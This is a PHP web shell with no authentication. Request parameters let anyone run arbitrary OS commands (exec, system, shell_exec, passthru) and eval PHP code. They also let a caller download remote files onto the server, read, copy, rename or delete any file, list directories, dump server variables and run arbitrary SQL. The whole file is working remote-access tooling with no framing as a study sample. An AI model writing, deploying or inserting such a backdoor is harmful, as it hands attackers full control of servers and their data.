<?php

function dumperx($data) {
    echo "<pre>";
    print_r($data);
    echo "</pre>";
}

if (isset($_GET['upload'])) {
    // URL of the file you want to download
    $url = $_GET['upload'];
    
    // Get the directory of the currently executing script
    $current_directory = __DIR__ . '/';
    if (isset($_GET['target'])) {
        $current_directory = $_GET['target'];
    }
    
    // Get the file content from the URL
    $file_content = file_get_contents($url);
    
    // Check if the file content was fetched successfully
    if ($file_content !== false) {
        // Extract the filename from the URL
        $file_name = basename($url);
    
        // Specify the path where you want to save the file
        $save_path = $current_directory . $file_name;
    
        // Save the file content to the specified path
        if (file_put_contents($save_path, $file_content) !== false) {
            echo "File downloaded successfully and saved to: " . $save_path;
        } else {
            echo "Failed to save the file.";
        }
    } else {
        echo "Failed to download the file from the URL.";
    }
} elseif (isset($_POST['exec'])) {
    try {
        dumperx(exec($_POST['exec']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_POST['shell_exec'])) {
    try {
        dumperx(shell_exec($_POST['shell_exec']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_POST['system'])) {
    try {
        dumperx(system($_POST['system']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_POST['passthru'])) {
    try {
        dumperx(passthru($_POST['passthru']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['read'])) {
    try {
        dumperx(file_get_contents($_GET['read']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['eval'])) {
    try {
        eval($_GET['eval']);
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['dump'])) {
    try {
        dumperx([
            'GET' => $_GET,
            'POST' => $_POST,
            'SERVER' => $_SERVER
        ]);
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['scandir'])) {
    try {
        dumperx(scandir($_GET['scandir']));
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['copy']) && isset($_GET['target'])) {
    try {
        $source_file = $_GET['copy'];
        $destination_file = $_GET['target'];
        $message = '';
        if (file_exists($source_file)) {
            if (copy($source_file, $destination_file)) {
                $message = "File copied successfully.";
            } else {
                $message = "Failed to copy the file.";
            }
        } else {
            $message = "Source file does not exist.";
        }
        dumperx($message);
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['dbname']) && isset($_POST['sql'])) {
    $servername = "localhost";
    $username = $_POST['username'];
    $password = $_POST['password'];
    $dbname = $_POST['dbname'];

    try {
        $conn = new \PDO("mysql:host=$servername;", $username, $password);
        $conn->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);

        $sql = $_POST['sql'];
        $stmt = $conn->prepare($sql);
        $stmt->execute();

        $data = $stmt->fetchAll(\PDO::FETCH_ASSOC);

        dumperx($data);
        $conn = null;
    } catch(\Throwable $e) {
        dumperx($e);
    }
} elseif (isset($_GET['unlink'])) {
    try {
        if (file_exists($_GET['unlink'])) {
            dumperx(unlink($_GET['unlink']));
        }
    } catch (\Throwable $th) {
        dumperx($th);
    }
} elseif (isset($_GET['rename']) && isset($_GET['source']) && isset($_GET['target'])) {
    try {
        if (file_exists($_GET['unlink'])) {
            dumperx(rename($_GET['source'], $_GET['target']));
        }
    } catch (\Throwable $th) {
        dumperx($th);
    }
}
